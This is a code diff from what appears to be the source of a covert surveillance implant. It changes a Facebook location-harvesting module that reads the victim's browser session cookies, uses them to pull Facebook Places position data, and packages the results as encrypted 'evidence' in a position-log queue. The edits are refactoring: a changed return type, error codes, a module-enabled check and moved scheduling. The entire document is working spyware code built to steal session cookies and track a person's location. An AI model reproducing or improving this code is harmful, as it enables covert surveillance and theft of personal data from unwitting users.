@@ -12,6 +12,7 @@
 #include "social.h"
 #include "facebook.h"
 #include "cookies.h"
+#include "social.h"
 
 POSITION_LOGS lpPositionLogs[MAX_POSITION_QUEUE];
 
@@ -482,14 +483,17 @@ BOOL QueuePositionLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
 	Params:			valid Facebook cookie
 	Usage:			-
 */
-VOID FacebookPlacesHandler(LPSTR strCookie)
+DWORD FacebookPositionHandler(LPSTR strCookie)
 {
 
 	LPSTR strUserId, strScreenName; 
 	LPSTR strParser1, strParser2;
 	
+	if (!ConfIsModuleEnabled(L"position"))
+		return SOCIAL_REQUEST_SUCCESS;
+
 	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
-		return;
+		return SOCIAL_REQUEST_BAD_COOKIE;
 
 	zfree_s(strScreenName);
 
@@ -506,7 +510,7 @@ VOID FacebookPlacesHandler(LPSTR strCookie)
 	{
 		zfree(strRecvBuffer);
 		zfree(strUserId);
-		return;
+		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
 	/* find the snippet of json we're interested in and give it to the parser */
@@ -516,7 +520,7 @@ VOID FacebookPlacesHandler(LPSTR strCookie)
 		/* cleanup */
 		zfree_s(strRecvBuffer);
 		zfree_s(strUserId);
-		return;
+		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
 	strParser2 = strstr(strParser1, "})");
@@ -537,9 +541,11 @@ VOID FacebookPlacesHandler(LPSTR strCookie)
 
 		if ( FacebookPlacesExtractPosition(jValue, &additionaheader, &lpBody, &dwSize, strUserId) )
 		{
+			
 			DWORD dwEvSize;
 			LPBYTE lpEvBuffer = PackEncryptEvidence(dwSize, lpBody, PM_LOCATION, (LPBYTE) &additionaheader, sizeof(additionaheader), &dwEvSize);
 			zfree_s(lpBody);
+
 
 			if (!QueuePositionLog(lpEvBuffer, dwEvSize))
 				zfree_s(lpEvBuffer);
@@ -552,7 +558,7 @@ VOID FacebookPlacesHandler(LPSTR strCookie)
 	if (jValue)
 		delete jValue;
 
-	return;
+	return SOCIAL_REQUEST_SUCCESS;
 }
 
 VOID PositionMain()
@@ -586,14 +592,9 @@ VOID PositionMain()
 					zfree(lpEvBuffer);
 			}
 
-			/* 2] facebook places */
-			LPSTR strFacebookCookies = GetCookieString(FACEBOOK_DOMAIN);
-			if (strFacebookCookies)
-			{
-				FacebookPlacesHandler(strFacebookCookies);
-				zfree(strFacebookCookies);
-
-			}
+			/* 2] facebook places
+				  scheduled in social.cpp
+			*/
 
 			
 		}
